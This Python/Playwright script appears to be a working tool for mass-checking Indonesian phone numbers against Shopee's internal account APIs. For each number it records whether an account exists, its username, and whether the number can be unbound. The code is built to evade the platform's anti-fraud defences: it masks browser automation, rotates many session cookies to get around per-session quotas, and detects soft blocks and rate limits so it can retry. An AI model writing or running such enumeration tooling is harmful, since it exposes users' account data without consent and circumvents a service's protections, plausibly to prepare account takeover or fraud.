# -*- coding: utf-8 -*-
"""
phone_batch2.py — batch cek nomor, TAHAN terhadap soft-block.

Pelajaran dari run pertama (300 nomor -> 92% ERROR setelah nomor ke-22):
  endpoint check_phone_exist punya kuota ~20-25 request per sesi/IP,
  setelah itu body dikosongkan (soft-block), bukan error code.

Strategi baru:
  * deteksi abort dini: 3x kosong beruntun -> STOP, jangan buang nomor
  * rotasi cookie: tiap kuota habis, ganti cookie + restart context
  * re-warm otomatis + backoff eksponensial
  * nomor yang belum sempat diproses tetap bisa di-resume
  * --cookies-dir : pakai banyak cookie sekaligus (folder / file list)

Usage:
  python3 phone_batch2.py .ck_new numbers.txt
  python3 phone_batch2.py --cookies-dir /root/cookies numbers.txt
  python3 phone_batch2.py .ck_new numbers.txt --resume
"""
from __future__ import annotations

import argparse
import json
import random
import re
import sys
import time
from pathlib import Path

from playwright.sync_api import sync_playwright

HOME = "https://shopee.co.id/"
UA = ("Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 "
      "(KHTML, like Gecko) Chrome/145.0.0.0 Safari/537.36")

CHECK_JS = r"""
async (a) => {
  const csrfM = document.cookie.match(/(^| )csrftoken=([^;]+)/);
  const csrf = csrfM ? csrfM[2] : '';
  async function post(url, body) {
    const hex = Array.from(crypto.getRandomValues(new Uint8Array(8)))
                    .map(b => b.toString(16).padStart(2,'0')).join('');
    const h = {
      'Content-Type':'application/json','Accept':'application/json',
      'x-api-source':'pc','x-requested-with':'XMLHttpRequest',
      'x-shopee-language':'id','af-ac-enc-dat': hex,
    };
    if (csrf) h['x-csrftoken'] = csrf;
    try {
      const r = await fetch(url, {method:'POST', headers:h, credentials:'include',
                                  body: JSON.stringify(body)});
      const t = await r.text();
      if (!t) return {__empty:true};
      return JSON.parse(t);
    } catch(e) { return {__exc: String(e)}; }
  }
  const p = a.phone;
  const ex = await post('/api/v4/account/basic/check_phone_exist', {phone: p});
  if (ex.__empty || ex.__exc) return {phone:p, blocked:true, why: ex.__exc || 'empty'};
  const res = {phone: p, exist_raw: ex};
  if (ex.error !== 0 && ex.error !== null) return res;
  const d = ex.data || {};
  res.exist = d.exist;
  res.user = d.user || null;
  if (d.exist === true) {
    const ub = await post('/api/v4/account/management/get_unbind_phone_check_result', {phone: p});
    if (!ub.__empty && !ub.__exc) res.unbind_raw = ub;
    else res.unbind_raw = {error: -999};
  }
  return res;
}
"""


def norm(p: str) -> str:
    d = re.sub(r"\D", "", str(p or ""))
    if not d:
        return ""
    if d.startswith("0"):
        d = "62" + d[1:]
    elif d.startswith("8"):
        d = "62" + d
    elif d.startswith("620"):
        d = "62" + d[3:]
    return d


def verdict_of(r: dict) -> str:
    if r.get("blocked"):
        return "BLOCKED"
    if r.get("error"):
        return "ERROR"
    ex = r.get("exist")
    if ex is False:
        return "FRESH"
    if ex is not True:
        return "ERROR"
    ub = r.get("unbind_raw") or {}
    d = ub.get("data") or {}
    if ub.get("error") != 0 or not d:
        return "TERDAFTAR_UNKNOWN"
    if d.get("phone_reuse_limit_check_failed"):
        return "REUSE_LIMIT"
    if d.get("account_status_check_failed"):
        return "LOCKED"
    return "BISA_UNBIND"


def load_jar(path: str) -> dict:
    jar = {}
    for seg in open(path).read().replace("\n", " ").split(";"):
        seg = seg.strip()
        if seg and "=" in seg:
            k, v = seg.split("=", 1)
            jar[k.strip()] = v
    return jar


class Worker:
    """Satu browser context = satu cookie."""

    def __init__(self, pw, jar, tag=""):
        self.tag = tag
        self.b = pw.chromium.launch(headless=True, args=[
            "--no-sandbox", "--disable-dev-shm-usage",
            "--disable-blink-features=AutomationControlled"])
        self.ctx = self.b.new_context(user_agent=UA, locale="id-ID",
                                      viewport={"width": 1366, "height": 900},
                                      timezone_id="Asia/Jakarta")
        self.page = self.ctx.new_page()
        try:
            self.ctx.add_cookies([{"name": k, "value": v, "domain": ".shopee.co.id",
                                   "path": "/", "secure": True, "sameSite": "None"}
                                  for k, v in jar.items()])
        except Exception:
            pass
        cdp = self.ctx.new_cdp_session(self.page)
        cdp.send("Network.enable")
        for k, v in jar.items():
            try:
                cdp.send("Network.setCookie", {"name": k, "value": v,
                                               "domain": ".shopee.co.id",
                                               "path": "/", "secure": True})
            except Exception:
                pass
        self.uid = 0
        self.warm()

    def warm(self) -> bool:
        try:
            self.page.goto(HOME, wait_until="domcontentloaded", timeout=60000)
            self.page.wait_for_timeout(5000)
            self.uid = self.page.evaluate("""async () => {
                try {
                  const r = await fetch('/api/v4/account/basic/get_account_info', {credentials:'include'});
                  const j = await r.json();
                  return (j && j.data && j.data.userid) || 0;
                } catch(e) { return 0; }
            }""")
        except Exception:
            self.uid = 0
        return bool(self.uid)

    def check(self, phone: str) -> dict:
        try:
            return self.page.evaluate(CHECK_JS, {"phone": phone})
        except Exception as e:
            return {"phone": phone, "blocked": True, "why": str(e)}

    def close(self):
        try:
            self.b.close()
        except Exception:
            pass


def main() -> None:
    ap = argparse.ArgumentParser()
    ap.add_argument("cookie", nargs="?", help="file cookie tunggal")
    ap.add_argument("numbers_file")
    ap.add_argument("--cookies-dir", help="folder berisi banyak file cookie")
    ap.add_argument("--out", default="/root/shopee-verify/batch2_result.jsonl")
    ap.add_argument("--delay", type=float, default=0.9)
    ap.add_argument("--quota", type=int, default=18,
                      help="max request per cookie sebelum rotasi (default 18)")
    ap.add_argument("--cooldown", type=int, default=90,
                      help="detik jeda saat kena 90309999 sebelum retry (default 90)")
    ap.add_argument("--max-retry", type=int, default=2,
                      help="berapa kali retry nomor yang kena rate limit")
    ap.add_argument("--resume", action="store_true")
    ap.add_argument("--max", type=int, default=0)
    args = ap.parse_args()

    # --- kumpulkan nomor ---
    nums, seen = [], set()
    for line in open(args.numbers_file):
        raw = line.strip()
        if not raw or raw.startswith("#"):
            continue
        n = norm(raw)
        if n and n not in seen:
            seen.add(n)
            nums.append(n)
    if args.max:
        nums = nums[: args.max]

    out = Path(args.out)
    done = set()
    if args.resume and out.exists():
        for line in out.open():
            try:
                rec = json.loads(line)
                if rec["verdict"] not in ("BLOCKED", "ERROR"):
                    done.add(rec["phone"])
            except Exception:
                pass
        print(f"[resume] {len(done)} nomor sudah sukses, dilewati")
        nums = [n for n in nums if n not in done]

    if not nums:
        print("[-] tidak ada nomor baru")
        return

    # --- kumpulkan cookie ---
    ck_files: list[str] = []
    if args.cookie:
        ck_files.append(args.cookie)
    if args.cookies_dir:
        for p in sorted(Path(args.cookies_dir).rglob("*")):
            if p.is_file() and p.stat().st_size > 100:
                ck_files.append(str(p))
    if not ck_files:
        print("[-] tidak ada cookie")
        return

    print(f"[*] {len(nums)} nomor | {len(ck_files)} cookie | "
          f"quota {args.quota}/cookie | delay {args.delay}s")

    fh = out.open("a")
    stats: dict[str, int] = {}
    retry_count: dict[str, int] = {}
    t0 = time.time()
    ck_idx = 0
    jar = load_jar(ck_files[0])

    with sync_playwright() as pw:
        w = Worker(pw, jar, tag=Path(ck_files[0]).name)
        if not w.uid:
            print(f"[!] cookie {ck_files[0]} tidak hidup, coba yang lain")
        else:
            print(f"[ok] cookie#0 {Path(ck_files[0]).name} uid={w.uid}")

        used = 0

        def rotate():
            nonlocal w, ck_idx, jar, used
            w.close()
            ck_idx += 1
            if ck_idx >= len(ck_files):
                print("[!] semua cookie habis kuota — istirahat 120s lalu reset")
                time.sleep(120)
                ck_idx = 0
            jar = load_jar(ck_files[ck_idx])
            w = Worker(pw, jar, tag=Path(ck_files[ck_idx]).name)
            used = 0
            print(f"[rot] cookie#{ck_idx} {Path(ck_files[ck_idx]).name} "
                  f"uid={w.uid or 'DEAD'}")

        i = 0
        while i < len(nums):
            phone = nums[i]
            r = w.check(phone)
            v = verdict_of(r)

            # 90309999 = rate limit anti-fraud, bukan cookie mati
            if r.get("exist_raw", {}).get("error") == 90309999 or v == "BLOCKED":
                retries = retry_count.get(phone, 0)
                if retries >= args.max_retry:
                    rec = {"phone": phone, "verdict": "RATE_LIMITED",
                           "username": "", "exist": None, "unbind": None,
                           "ts": int(time.time())}
                    fh.write(json.dumps(rec, ensure_ascii=False) + "\n")
                    fh.flush()
                    stats["RATE_LIMITED"] = stats.get("RATE_LIMITED", 0) + 1
                    print(f"  [{i+1:>5}] {phone} RATE_LIMITED (skip)")
                    i += 1
                    used = 0
                    time.sleep(args.cooldown)
                    w.warm()
                    continue

                retry_count[phone] = retries + 1
                print(f"  [ratelimit] {phone} -> cooldown {args.cooldown}s "
                      f"(retry {retries+1}/{args.max_retry})")
                time.sleep(args.cooldown)
                w.warm()
                used = 0
                continue

            used += 1
            stats[v] = stats.get(v, 0) + 1

            user = r.get("user") or {}
            rec = {
                "phone": phone,
                "verdict": v,
                "username": user.get("username") or "",
                "exist": r.get("exist"),
                "unbind": (r.get("unbind_raw") or {}).get("data"),
                "ts": int(time.time()),
            }
            fh.write(json.dumps(rec, ensure_ascii=False) + "\n")
            fh.flush()

            pct = (i + 1) * 100 // len(nums)
            eta = ((time.time() - t0) / (i + 1)) * (len(nums) - i - 1)
            print(f"  [{i+1:>5}/{len(nums)}] {pct:3}% {phone:15} {v:20} "
                  f"{('@'+rec['username']) if rec['username'] else '':18} "
                  f"q{used:>2} eta {eta:.0f}s")

            i += 1
            if used >= args.quota:
                print(f"  [quota] {used} terpakai -> rotasi")
                rotate()
                if not w.uid:
                    time.sleep(20)
                    continue
                continue

            time.sleep(args.delay)

        w.close()
    fh.close()

    dur = time.time() - t0
    print(f"\n{'='*64}\nSELESAI {len(nums)} nomor dalam {dur:.1f}s")
    for k, v in sorted(stats.items(), key=lambda x: -x[1]):
        print(f"  {k:22} {v:>6}  ({v*100//max(len(nums),1)}%)")
    print(f"\n[+] {out}")


if __name__ == "__main__":
    main()
